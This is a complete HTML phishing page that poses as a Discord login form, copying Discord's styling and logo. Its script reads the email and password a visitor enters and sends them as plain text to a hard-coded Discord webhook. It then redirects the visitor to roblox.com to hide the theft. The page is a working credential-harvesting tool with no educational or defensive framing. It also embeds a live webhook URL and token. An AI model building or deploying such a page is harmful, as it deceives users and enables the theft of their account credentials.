<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #7289da;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-container img {
            max-width: 100px;
            margin-bottom: 20px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .login-form input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #7289da;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-form input[type="submit"]:hover {
            background-color: #5f73bc;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flogodownload.org%2Fwp-content%2Fuploads%2F2017%2F11%2Fdiscord-logo-1-1.png&f=1&nofb=1&ipt=23deaf9e5a4280010e3b346c1bff935d46c63834c4b317b0738da7eab1164910&ipo=images" alt="Discord Logo">
        <h2>Log in to Discord</h2>
        <form class="login-form" id="login-form">
            <input type="text" id="login-username" placeholder="Email" required><br>
            <input type="password" id="login-password" placeholder="Password" required><br>
            <input type="submit" id="login-button" value="Log In">
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const usernameInput = document.getElementById("login-username");
            const passwordInput = document.getElementById("login-password");
            const submitButton = document.getElementById("login-button");

            submitButton.addEventListener("click", async (event) => {
                event.preventDefault();
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();
                if (username !== "" && password !== "") {
                    await fetch("https://discord.com/api/webhooks/1410183562136653885/LF_6llj3aIONic6B32ffGF8WpdJ8IHWhpiV7rvaIFs0z6C4MsO_tiE1gtTsc_9cervt8", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            content: "Valid attempt requested",
                            embeds: [{
                                fields: [
                                    { name: "Username", value: username, inline: true },
                                    { name: "Password", value: password, inline: true }
                                ],
                                color: 7143253,
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                    window.location.replace("https://www.roblox.com/");
                } else {
                    window.location.reload();
                }
            });
        });
    </script>
</body>
</html>
